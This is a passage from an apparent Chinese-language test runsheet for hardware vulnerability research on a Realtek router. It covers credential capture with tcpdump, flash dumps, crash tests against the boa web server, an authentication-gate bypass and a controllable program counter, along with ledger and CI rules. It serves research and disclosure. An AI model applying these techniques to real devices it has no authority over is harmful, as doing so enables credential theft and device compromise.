| T3 | **純讀。**一個 `tcpdump` | [`RUNBOOK` §8.12.35](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

```bash
sudo tcpdump -i eth1 -s0 -w dumps/w07-creds.pcap 'host 10.1.1.1 and tcp port 80'
```

**反證條件才是重點**：抓到的封包裡密碼**不是**明文 → 有某種前端雜湊，
那要回去讀 `w6cg` 裡的 JS。`P8-20` 這一週只做靜態那一半，**「拿到 shell 之後」
要寫成條件句。**

---

### A3.22 🔌 無線指紋與登入計時（關 `P1-11` · `P2-10`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **純讀** | [`RUNBOOK` §8.12.36](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

`P1-11` 用途是**否證一個排除理由**：掃到 5 GHz 或 SAE，`E-8` 的排除就不成立。

`P2-10` **預期會失敗**，而它的反證條件寫得很清楚：分佈重疊要記成
**方法限制**而不是「沒有時間差」。**這兩句話在資料上長得一模一樣。**

---

### A3.23 🔌 把桌面算出來的兩份清單拿到矽上（關 `P5-6` · `P1-7`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **第一發會把 `boa` 弄掉，要斷電** | [`RUNBOOK` §8.12.37](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

**分成兩發，而且不准混在同一張卡上：**

1. `formSchedule`，**缺 `webpage`**。預期：web server 消失且不會自己回來。
2. 另外抽 2–3 個原本在那 39 個裡、現在活著的（`formNtp`、`formDMZ`）。
   **預期：它們在矽上會活著**，因為核心會補對齊。

> ⚠️ **第二發的反證條件比第一發的預測重要。** 如果那 2–3 個在實機上也死掉，
> **對齊那套解釋就是錯的**，而 `tools/alignfix` 打開之後量到的每一件事、
> 以及 `bughunt.md` 第 16 列的改寫，全部退回原點。

`P1-7` 在同一節：**實機上要看 `302` 的目的地不是狀態碼**，那個錯桌面上犯過一次。

---

### A3.24 🔌🔴 Reset 按鈕：全場最後一發（關 `P9-9`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **不可逆。**它抹掉前面每一項站著的地面 | [`RUNBOOK` §8.12.38](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

**在按下去之前，這一場所有的紀錄卡都要先寫完。**

前後各一份 `H601` 快照，而且這一步不可以省：

```bash
python3 tools/console-dump.py dump --at-prompt --flash 0x3F0000 --length 0x1000 \
        --ram 0x80560000 --chunk 512 -o dumps/w07-h601-pre.bin
```

**預期**：`COMPCS` 變回 `COMPDS`，而 **`H601` UNCHANGED**。
`H601` 放的是這一台獨有的 MAC 與射頻校準 —— 如果 reset 把它蓋掉，
**這台就永久地不再是它自己了，而且不會有任何錯誤訊息。**

---

## 第 4 站 · 收工 —— 不碰裝置

**照順序** `A4.1` → `A4.2`

**進站**：不需要。
**出站**：不需要。

> 🔴 **跳過這一站，前面三站全部白做。** 一個沒有登記進去的結果，讀者只能選擇相信你 —— 而這個 repo 整個排法就是為了不要那樣。

### A4.1 收尾與紀錄（不關登記簿項目）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T1（記錄本身不碰裝置） | 沒有 | [`RUNBOOK` §8.12.8](RUNBOOK.md) | 2026-08-17 |

**這一節是把「我跑過」變成「repo 裡有一筆可被質疑的紀錄」。跳過它，前面全部白做。**

#### A4.1.1 每一項跑完就登記，不要累積到最後

```bash
python3 tools/rtcase.py record --id P1-2 --date 2026-08-17 \
    --verdict confirmed --evidence dynamic \
    --artefact BENCH-LOG.md \
    --note "80 開;52869 / 52881 也開,而它們不在任何一條預測裡。22 / 23 / 5555 關,IoC 八埠全關。四次對照組全 200,所以 closed 是裝置的答案。"
```

| 參數 | 值域 | 意思 |
|---|---|---|
| `--id` | 登記簿裡的編號 | 打錯 → 工具直接拒絕 |
| `--date` | `YYYY-MM-DD` | 測試**執行**的日期，不是登記的日期 |
| `--verdict` | `confirmed` / `refuted` / `partial` / `na` | 對照**事先凍結**的那句話判，不是對照你的感覺 |
| `--evidence` | `dynamic` / `static` / `emulated` | 見下，這一欄不能含糊 |
| `--artefact` | **repo 裡存在的路徑**，可重複 | 見下 |
| `--note` | 自由文字 | substance 寫在這裡 |

**`--evidence` 三個等級，而它們渲染成不同的符號：**

| 值 | 意思 | 渲染 |
|---|---|---|
| `dynamic` | 在**這台矽**上跑出來的 | ✅ |
| `static` | 讀出來的（反組譯、字串、dump） | 🟥，**永遠不會變成 ✅** |
| `emulated` | 在模擬環境裡**執行**過，但不是矽 | 🟪，**也永遠不會變成 ✅** |

> 🔴 **`emulated` 是 2026-08-17 才加的第三個等級，而它解決一個真實的困境：**
> `A1.4` 的環境讓這台自己的 binary 對這台自己的 flash 真的**跑起來**了。
> 記成 `static` 低估了（有東西執行了）；記成 `dynamic` 就是**這個登記簿存在的目的
> 要防的那種漂白**。所以它有自己的符號，而且不會變成勾。

> ❌ **`--artefact` 必須是 repo 裡存在的檔。** `~/fwre-work/dumps/` **不在 repo 裡**，
> 所以不能當 artefact —— `rtcase check` 會擋掉指向不存在檔案的證據連結。
> **慣例是指向 `BENCH-LOG.md`**，而 substance 寫在 `--note` 裡。

> ❌ **`rtcase` 會拒絕一個沒有事先寫好反證條件的項目，而那不是 bug。**
> 訊息長這樣：`P?-? has no refutation condition. Write it into the register and re-freeze`。
> **一個沒有事先寫下「失敗長什麼樣」的測試，事後一定會被讀成成功** ——
> 因為回應到手的時候，讀的人已經知道自己想看到什麼了。

> ⚠️ **每一筆結果會戳上它當時所依據那段反證文字的逐項雜湊。**
> 所以事後去改反證條件會被抓到：`rtcase check` 會說
> `result was recorded against a different wording`。**這不是防篡改** ——
> 你手上有鑰匙 —— 它是「改動出現在 diff 裡」和「不會」的差別。

#### A4.1.2 重生成、驗證、看還欠什麼

```bash
make ledger
make todo WEEK=W05
make rtcase
```

**預期**：

```text
wrote test-ledger.md - 130 cases, 34 executed
W05: 27/27 done, 0 outstanding
register OK - 130 cases, 102 frozen, 34 executed, freeze 69c342dc...
  schedule d68ace7d..., 4 rescheduled: P3-1, P3-2, P3-3, P9-9
```

> ⚠️ **`test-ledger.md` 是生成的，不要手改。** CI 會跑
> `make ledger && git diff --exit-code`，改了登記簿沒重生成就紅。

> ⚠️ **`4 rescheduled` 那一行是刻意顯眼的。** `week` 欄位進了第二個雜湊
> `[schedule].sha256`，所以**搬動一項到別的週必須同時寫下 `rescheduled_from`、
> 理由、日期，並重新宣告雜湊** —— 少一個 CI 就紅。
> 那條機制存在的原因：W05 有四項排在 W05 但**週計畫自己禁止本週做**，
> 所以收斂指令永遠到不了 0。**決定早就寫在 `PROGRESS.md`，不一致的是資料。**

#### A4.1.3 往 BENCH-LOG 追加這一場

**格式**：計畫（動手之前寫的）→ 紀錄卡 → 實測結果 → 燒掉了什麼 → 下一場從哪裡開始。

> 🔴 **計畫要在動手之前 commit。** append-only 加上 git，讓「寫在前面」這件事
> **可以被 diff 證明** —— 而那是這整套東西唯一不肯妥協的一件事。
> 一份事後才寫的成功條件證明不了任何東西。

> ⚠️ **只追加，不修改既有段落。** 一場做完就定版，連你發現自己當時錯了也一樣 ——
> **把更正寫在新的一場裡**。2026-08-17 的兩處更正（`FLW` 的預期字樣、
> 閘門的錯誤推論）就是這樣處理的。

> ⚠️ **per-unit 識別碼（MAC、SSID、`config.dat` 內容、射頻校準值）不寫進來。**
> 跟 W02 把 PCB 條碼塗掉是同一條規則，而揭露策略的擁有者是
> [`docs/disclosure.md`](docs/disclosure.md) —— **這裡不複述它，只指向它。**
> （標頭曾經複述過，然後跟自己檔案裡的一段矛盾了。）

#### A4.1.4 一週結束時還有三件事

| 檔案 | 寫什麼 |
|---|---|
| [`PROGRESS.md`](PROGRESS.md) | gate、DoD、carried-forward。**不要把單項測試結果寫成散文** |
| [`README.md`](README.md) | gate 勾選板 + 一行數字。**跟 PROGRESS 同一個 commit** |
| [`study/weekly-results.md`](study/weekly-results.md) | 一句話版本、三個可辯護的點、**以及「這週沒證明什麼」** |

> 🔴 **「這週沒證明什麼」那一欄是空的，代表這一週的自我檢查不夠。**
> 那一欄是三個裡面最重要的一個。

---

### A4.2 出事的時候（不關登記簿項目）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T1 / T2 / T3 | 看你照哪一列做 | [`RUNBOOK` §8.12.13](RUNBOOK.md) | 2026-08-17 |

| 症狀 | 原因 | 做什麼 |
|---|---|---|
| `Cannot find device "eth1"` 而 `ping` 卻通 | 網卡在 Windows 側，你繞過去了 | `A3.1` 的 `ip route get`。看 `via` |
| 抓不到任何封包 | 先看 `rx_packets`。`0` = 鏈路沒在送東西給你 | `A3.3` |
| `Speed: Unknown!` / `Duplex: Half` | 協商沒完成，或對端沒起來（例如板子停在 bootloader） | 正常，繼續 |
| 所有端點都「不存在」 | 你可能把 `boa` 打掛了 | `python3 tools/bench-probe.py control --host 10.1.1.1` |
| `boa` 完全不回應但 `ping` 通 | `A3.8` 的已知結果。`rcS` 不 respawn | **拔電重開** |
| `catch` 說 `booted past the interrupt window` | 板子沒有真的斷電過 | 確實拔電，停 2 秒，重跑 `A2.2` |
| `DB` 印出來跟上一次一樣 | `FLR` 沒生效（多半是 `Y` 被下一個指令吃掉） | 那是 RAM 舊值，不是 flash |
| 打錯 `FLW` 參數 | —— | **不要再送任何指令。拍照。** |
| `rtcase check` 說 artefact 不存在 | 證據連結要指到 repo 裡存在的檔 | `A4.1` |
| `test-ledger.md is out of date` | 改了登記簿沒跑 `make ledger` | `make ledger` |
| `binwalk: command not found` 而它明明裝了 | `~/.cargo/bin` 不在這個 shell 的 PATH | `bash tools/setup/setup-wsl.sh path`，然後用 `bash -lc` |
| IoC 預檢不是你記的那個數字 | 可能是上一場的 POST 輪 | 讀 `BENCH-LOG.md` 最後一場的「燒掉了什麼」 |

---

# Part B — 每一週跑哪幾節

> **只追加。** 一週做完就定版。**Part A 是可編輯的；這裡不是。**

## B-0 2026-08-17：Part A 重編過號，這是舊新對照

**Part A 原本是 `A0`–`A14`，中間插了 `A1.6` `A1.7` `A8.5` `A11.5` 四個編號。**
那四個數字記錄的是編輯順序，不是結構，而 `A8` 裡面還有一個 `A8.5-預告`
跟 `A8` 外面的 `A8.5` 幾乎同名。更糟的是**讀的順序不是做的順序**：
Part A 是 `A0`→`A14`，而下面 W05 那兩列的實際順序是 `A0`→`A2`→`A3`→`A5`→`A4`→…
—— `A5` 在 `A4` 前面，因為 `A5` 要板子停在 `<RealTek>`。

**改成兩段式編號之後，第一位數字就是板子必須在的狀態**，那個顛倒消失了。
**下面 W05 兩列的順序沒有改，只是換了新編號。** 對照表：

| 舊 | 新 | | 舊 | 新 | | 舊 | 新 |
|---|---|---|---|---|---|---|---|
| `A0` | `A1.1` | | `A4` | `A3.1` | | `A9` | `A3.8` |
| `A1` | `A1.2` | | `A5` | `A2.3` | | `A10` | `A3.2` |
| `A1.6` | `A1.3` | | `A6` | `A3.3` | | `A11` | `A2.4` |
| `A1.7` | `A1.4` | | `A7` | `A3.4` | | `A11.5` | `A3.7` |
| `A2` | `A2.1` | | `A8` | `A3.5` | | `A12` | `A2.5` |
| `A3` | `A2.2` | | `A8.5` | `A3.6` | | `A13` | `A4.1` |
| | | | `A8.5-預告` | `A3.5.5` | | `A14` | `A4.2` |

> ⚠️ **[`BENCH-LOG.md`](BENCH-LOG.md) 用的是第三套編號**（`§8.12.x`），而它是逐字紀錄、
> **不改**。`RUNBOOK.md` §8.12 的每一小節現在指名它對應的 `A` 節，反向也指，
> 而 `make ci` 檢查那個對應是一對一。三套編號還是三套，但橋是機械維護的。

## B-W05 偵察（2026-08-17，已完成：登記簿 27/27、DoD 5/5）

| 場次 | 順序 | 本週特有 |
|---|---|---|
| 上午 | `A1.1` → `A2.1` → `A2.2` → `A2.3` → `A3.1` → `A3.3` → `A3.4` → `A3.5` → `A4.1` | `A2.5` 的 `FLW` 演練（一次性，G3.5 #5） |
| 下午 | `A1.1` → `A2.1` → `A2.2` → **`A2.5` 讀磁區** → `A2.3` → `A3.1` → `A2.4` → `A3.2` → `A3.5` → `A3.8` → `A2.2` → `A2.3` → `A4.1` | 磁區語意判別；`P9-1` 靜態三來源 |

**下午那個順序有一個理由**：`A2.5` 的磁區讀取排在最前面，因為它答的是 W06 卡住的
那一格，而**一場只要提早結束，最不能掉的就是它**。

**這一週實際發生了什麼、以及四個儀器缺陷** → [`BENCH-LOG.md`](BENCH-LOG.md)。
**判定** → [`test-ledger.md`](test-ledger.md)。**推理** → [`PROGRESS.md`](PROGRESS.md)。

## B-W06 PoC（2026-08-17 夜，已完成：登記簿 18/18、G4 四之五）

| 場次 | 順序 | 本週特有 |
|---|---|---|
| 第 2 站 ① | `A1.1` → `A2.1` → `A2.2` → `A2.3` → **`A2.6`**（`probe-eb` → 工具演練 → 寫入 → 分段驗證）→ `A2.3` | `A2.6` 首次執行；`EB` 一行的容量首次量到 |
| 第 3 站 ① | `A3.1` → `A3.6` → `A3.6.4` → `A3.7` → `A3.9`（全）→ `A3.10.2` 開火 | 第 ⑤ 環開火 |
| 第 2 站 ② | `A2.2` → `A2.3` | 第 ⑤ 環的「後」快照 |
| 第 3 站 ② | `A3.11` → `A3.12` | `A3.12` 打錯 handler 兩次，第三次才找到會回顯的證人 |
| 第 3 站 ③ | 單發 `formSchedule` + 三發對照 | `D-11`：一個請求殺掉 server |
| 第 3 站 ④ | 還原 WSC PIN → `poc/run.sh --target` | 腳本本身第一次被執行 |
| 第 2 站 ③ | `A2.2` → `A2.3` | 收工快照、`P10-10` |

**這一週的順序有三個地方跟 Part A 的文件順序不同，三個都有理由：**

1. **`A3.12` 裡 `P4-1` 排到最後。** Part A 把它排第一，而它自己的預測就是
   「一個請求、零 payload，server 消失」—— 排第一等於在其餘四項有機會之前
   就燒掉一次開機循環。
2. **`A2.6` 的還原排在開場。** 事後證明**那是錯的**：本場自己的 POST 又把
   `COMPDS` 蓋回去了。**它屬於一場的最後。** 這一列保留原樣是因為本節只追加，
   而修正寫在 `A2.6` 那一節與 `BENCH-LOG.md` 卡 9。
3. **第 2 站進了三次。** 第 ⑤ 環要「注入前」與「注入後」各一份快照，而快照在第 2 站。
   八次開機循環裡有三次是 `boa` 被打掛之後的復原。

**這一週實際發生了什麼、以及五個儀器缺陷** → [`BENCH-LOG.md`](BENCH-LOG.md)。
**判定** → [`test-ledger.md`](test-ledger.md)。**推理** → [`PROGRESS.md`](PROGRESS.md)。

---


## B-W07 Bug hunt（2026-08-18 桌面完成 11/57；進站部分**尚未執行**，這是進站前寫下的順序）

**這一週的桌面與進站是分開的兩場，而那是刻意的。** W07 有十一條測試沒有寫反駁
條件，`rtcase record` 對這種案子直接拒收，而週計畫把那十一條全部排進同一次
進站。先進站的結果照這個 repo 自己的規則不可採納，所以 2026-08-18 那一場**完全
沒有插電**：補齊十一條、凍結、再排進站。

| 場次 | 順序 | 本週特有 |
|---|---|---|
| 桌面（已完成） | `A1.1` → `A1.2` → `A1.4` | 十一條反駁條件補齊並凍結；`P8-24` 與 `P9-13` 兩條新案在實驗**之前**入冊 |
| 第 3 站 ① | `A3.1` → `A3.7` → **`A3.13`** → `A3.4` | `A3.13` 首次執行，而且排在偵察**之前**：三個 GET、不寫、不斷電，而它可能推翻 `D-15` |
| 第 3 站 ② | UDP 重掃 + UPnP + DNS 身分確認 | **`P6-4` 的 UDP 從來沒有被 UDP 掃過** —— `A3.4` 用的是 `nmap -sT`；52869 的 SOAP 端點是 `/upnp/control/WANIPConnection` 不是手冊寫的 `WANIPConn1` |
| 第 3 站 ③ | 會改設定的那批（`P8-3` `P8-7` `P8-11` `P8-14` `P8-23`） | 每一項前後各一份 64 KiB 快照 |
| 第 3 站 ④ | `A3.12` 風格的抽樣：39 個裡挑 3–4 個，`formWsc` 第一個 | 開放問題 #47：模擬下的死亡在矽上算不算數 |
| 第 3 站 ⑤ | `A3.11` → `P8-4` → **`P9-9` 最後** | `P9-9` 會把 `COMPCS` 蓋回 `COMPDS`，**它抹掉的是前面每一項站著的地面** |

**三個進站前就知道的坑，寫在這裡而不是等它們發生：**

1. **`A3.13` 必須在 `A3.11` 之前。** `A3.11.2` 會把管理密碼設成空字串，而那會
   讓 `A3.13` 量到 `D-4` 而不是 `D-15` —— 兩個缺陷產生一模一樣的「不帶密碼就
   進得去」。分辨它們的是錯密碼那一列，而錯密碼那一列只有在密碼非空時有意義。
2. **`P9-9` 排在全場最後，而理由跟危險程度無關。** 它的預測是「reset 會把
   `COMPCS` 覆寫回 `COMPDS`」，所以它執行完之後，這一場前面每一項改過的設定都
   不存在了。`P0-5` 的 IoC 預檢基準（`COMPCS` 與 `COMPDS` 差 4/343）也會歸零。
3. **`D-15` 的請求不在這份檔案裡。** 它在 `$FWRE_WORK/disclosure/` 底下，
   理由與 `A3.13` 那一節裡寫的相同。

**進站之前要先跑完的桌面工作**：`P5-6` 帶頭的 `P4`/`P5` 區塊。那一批在模擬環境
裡做完之後，實機只需要驗一次偏移，而不是把整條鏈搬到會斷電的機器上組。

---

## B-W07 增補（2026-08-18 桌面第二場，寫在進站之前）

**上面那張表不改，一個字都不改。** 這是照它原本的編號往下接的增補，而它存在的
理由跟本節「只追加」的規則是同一個：**改動要能被 diff 證明是事先做的。**

**桌面那一場又跑了一次，而且它把登記簿從 11/58 推到 28/58。** 新增五節作業單
（`A1.5`–`A1.9`），全部在第 1 站，全部不碰裝置。

| 場次 | 順序 | 本週特有 |
|---|---|---|
| 桌面 ②（已完成） | `A1.1` → `A1.5` → `A1.6` → `A1.7` → `A1.8` | 六個 build 的分派表第二來源；`formWsc` 的 `$pc` 完全可控 |

**進站那一場的順序改了，而且是因為量到的東西改了，不是因為想法改了：**

| 場次 | 順序 | 改在哪裡 |
|---|---|---|
| 第 3 站 ① | `A3.1` → `A3.7` → **`A3.13`** → `A3.2` | **`A3.2` 前移**，因為 `P2-11`（601 秒視窗）要它的時鐘，而視窗只有上電後十分鐘 |
| 第 3 站 ② | `A3.14` → `A3.15` → `A3.16` | UDP 重掃 / UPnP / DNS 身分，三節取代原本的一格 |
| 第 3 站 ③ | `A3.19` → `A3.18` | 改設定那批，`A3.18` 要假 ISP 所以排在後面 |
| 第 3 站 ④ | **`A3.23`** | 抽樣那一格：原本寫「39 個裡挑 3–4 個，`formWsc` 第一個」，**39 這個數字已經被推翻**，現在是五個有名字的加 2–3 個對照 |
| 第 3 站 ⑤ | `A3.11` → `A3.17` → `A3.22` → `A3.20` → **`A3.24` 最後** | `A3.20` 做完 `boa` 很可能不在，所以排在需要它的每一節之後 |

**這一次增補改掉的三件事，逐條寫在這裡而不是改上面那張表：**

1. **`A3.13` 的措辭要改，位置不改。** 那兩個「沒人寫」的緩衝區是
   `MIB_SUPER_NAME`(180) / `MIB_SUPER_PASSWORD`(181)，三個 build 沒有一個取過它們。
   卡片不能再寫「取得比真實憑證更高的權限層級」，正確的是**「整段授權閘門不執行」**。
2. **`A3.2` 多了一項，而它原本連程序都不存在。** `P2-11` 是 2026-08-18 才入冊的，
   凍結在進站之前 —— 這是 `tools/check-runsheet.py` 新規則存在的直接理由。
3. **抽樣那一格從「39 選 3–4」變成「五個，而且都有名字」**，理由在
   `RUNBOOK` §8.12.37。

**這一週實際發生了什麼、以及儀器缺陷 44** → [`BENCH-LOG.md`](BENCH-LOG.md)。
**判定** → [`test-ledger.md`](test-ledger.md)。**推理** → [`PROGRESS.md`](PROGRESS.md)。

---

# 附錄 關掉的項目為什麼由機器維護

**[`test-ledger.md`](test-ledger.md) 裡每一個有結果的項目，都必須有一節可以走到它。**

那不是口號。`make ci` 跑的 `tools/check-runsheet.py` 雙向檢查：

1. 一節標題聲稱關掉的每一個編號，**必須真的在登記簿裡** ——
   打錯字、憑空發明的編號，看起來跟真的覆蓋率一模一樣；
2. **登記簿裡每一個已執行的項目，必須至少被一節聲稱** —— 否則 CI 紅。
   真的沒有程序的，要寫進 `<!-- no-procedure: … -->` 區塊**並附理由**。

**第二個方向才是重點。第一個方向在一份空的對應表上也會過。**

<!-- no-procedure:
P0-11 P3-14 —— 這兩項是**桌機**測試，而這份檔案是**實機**檔案：它的四個站
就是裝置的四個狀態，所以一個完全不碰裝置的程序在這裡沒有位置可放。它們的
程序確實存在，而且是可執行的一行一行：`poc/05-l2-published-image.md`
的「Building the environment」段，以及 `REPRODUCE.md` 的 T1 層。整條路是
`qemu-env.sh --profile v2.1.2 mkflash` → `build` → `serve`，產出的 flash
映像 sha256 被釘在 profile 裡，所以「別人照做會得到同一份」是可檢查的。

這個豁免同時暴露檢查器本身的一個結構縫：它只讀 `runsheet.md`，所以
**桌機程序沒有任何被機器檢查的家**。實機那一半有，桌機那一半沒有。
記在 `PROGRESS.md` 開放題 #46。

P4-7 —— 模擬環境上的 57 端點掃描。它需要的是 `qemu-env.sh serve` 與
`tools/handler-sweep.py`，不是一台開著的路由器；在實機上跑它等於 39 次
斷電重開。**它產出的是候選清單，不是關於裝置的主張**，而清單的實機抽樣是
第 3 站的工作，那一節會在抽樣真的排進去的時候寫。

P8-15 —— 命令面盤點的那一半（rootfs 沒有 nc/tftp/curl，busybox 自報的
48 個 applet 也沒有）是在模擬環境裡問裝置自己的 busybox 得到的。外洩本身
未演示，而未演示的那一半也沒有步驟可寫。

P2-9 的桌面半邊、P8-1 P8-5 P8-8 P8-10 P8-18 P8-24 P9-13 P10-7 ——
**全部是靜態或模擬，2026-08-18 一場不碰裝置的桌面工作。** 它們的程序是
`ghidra/analyze.ps1` 加上 `tools/failopen-probe.sh`，而兩者都不需要裝置。
其中 P2-9 與 P8-5 有實機的那一半，寫成 `A3.13`；其餘七項沒有實機的那一半，
因為它們問的是「這支 binary 裡有沒有這段程式碼」，而那個問題在裝置上問不出
更好的答案。

**這一批把上面那個結構縫從「兩項」擴大成「十一項」**：桌機程序仍然沒有
任何被機器檢查的家。開放題 #46 的份量隨之上升。
-->


> **這個檢查是作者在 2026-08-17 問出來的**：「我們不是關掉了 27 項嗎，
> 那不是應該有 27 個可以被重複執行的東西？」—— **是。而當時去量，
> 這份檔案只提到 27 項裡的 1 項。** 補完之後才發現有兩節（`A1.3` `A1.4`）
> 和一節（`A3.6`）**根本不存在**，而 `A3.6` 是這個專案最強的那一條證據鏈。
>
> **「一個結果沒有人能走到它的程序」= 一個讀者只能相信你的主張**，
> 而這整個 repo 就是為了不要那樣而排的。

**同一支檢查器另外驗六件事**，每一件都因為曾經壞過而存在：

| 它驗什麼 | 為什麼 |
|---|---|
| 每個 `make` 目標存在、每個 `tools/` 路徑存在 | 搬過檔案的人不會回來改作業單 |
| **每個旗標真的在那支工具自己的 `--help` 裡** | `AUTOBURN: 0` 這種「說明文字不是語法」的錯誤，只有把命令當命令讀才抓得到 |
| 每個 `§8.x.y` 解析得到 RUNBOOK 的標題 | 兩份檔案分工，只有在指標有效時才是分工 |
| **每個 `A` 節與 `§8.12.x` 一對一** | 少一邊就是有一步沒有「為什麼」，或有一段「為什麼」沒有步驟 |
| **`RUNBOOK.md` §8.12 裡一個命令 fence 都不准有** | 見下 |
| 每個 fence 都標了語言 | 「要跑的」和「會看到的」長得一樣，是本檔最容易害人的地方 |

> 🔴 **最後那條規則是 2026-08-17 補的，而它補的是一個真實的失效。**
> §8.12 的開頭寫著「命令搬走了，這一節只講為什麼」—— 然後它裡面有 12 個命令塊，
> 其中**四個已經被當天的實測否證掉了**：冒號式的 `AUTOBURN: 0`（回 `Unknown command !`）、
> 「`ping` 有回應」當成救援成功條件（loader 不實作 ICMP）、
> 「Linux 一定會印 `Kernel command line:`」（那個字串不在 image 裡）、
> 以及用兩個終端機量冷開機時間（兩個時鐘不能相減）。
>
> **檢查器看不到它們，因為它只讀 `runsheet.md`。**
> 所以修法不是「去檢查 §8.12 的命令」，是**讓它不准有命令** ——
> 一個不准放命令的段落裡，不可能有過期的命令。
